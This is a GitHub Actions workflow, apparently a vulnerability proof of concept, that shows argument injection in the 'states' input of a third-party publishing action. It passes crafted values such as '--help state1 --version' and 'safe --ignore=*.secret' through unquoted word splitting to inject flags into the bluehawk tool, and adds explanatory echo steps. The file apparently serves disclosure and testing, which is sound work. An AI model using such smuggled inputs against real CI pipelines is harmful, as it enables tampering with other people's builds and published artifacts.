name: POC - Command Injection via states input

on:
  workflow_dispatch:
  push:
    branches:
      - main

jobs:
  # Test 1: States word splitting - each space-separated value becomes a state
  exploit-states-splitting:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: POC - States word splitting
        uses: mongodb/push-to-artifact-repo@main
        continue-on-error: true
        with:
          email: "poc-test@example.com"
          name: "POC Tester"
          # Without quotes in the for loop, this creates unexpected iterations
          # The loop: for state in $INPUT_STATES
          # Will iterate over each space-separated word
          states: "--help state1 --version"
          source: "./source"
          toRepo: "https://github.com/nonexistent/repo.git"

      - name: Analysis
        run: |
          echo "============================================"
          echo "ANALYSIS: Word splitting in 'states' input"
          echo "============================================"
          echo ""
          echo "The unquoted 'for state in \$INPUT_STATES' causes:"
          echo "1. Loop iterates over: '--help', 'state1', '--version'"
          echo "2. Each becomes --state X --branch X argument"
          echo "3. This can inject arbitrary flags to bluehawk"
          echo ""
          echo "Check the action logs above to see how bluehawk processed these"

  # Test 2: Inject extra bluehawk options via states
  exploit-states-options:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: POC - Inject bluehawk options
        uses: mongodb/push-to-artifact-repo@main
        continue-on-error: true
        with:
          email: "poc-test@example.com"
          name: "POC Tester"
          # Try to inject --ignore or other bluehawk options
          states: "safe --ignore=*.secret"
          source: "./source"
          toRepo: "https://github.com/nonexistent/repo.git"

      - name: Analysis
        run: |
          echo "============================================"
          echo "ANALYSIS: Option injection via 'states'"
          echo "============================================"
          echo ""
          echo "Attempted to inject: --ignore=*.secret"
          echo "This demonstrates how unquoted vars allow flag injection"
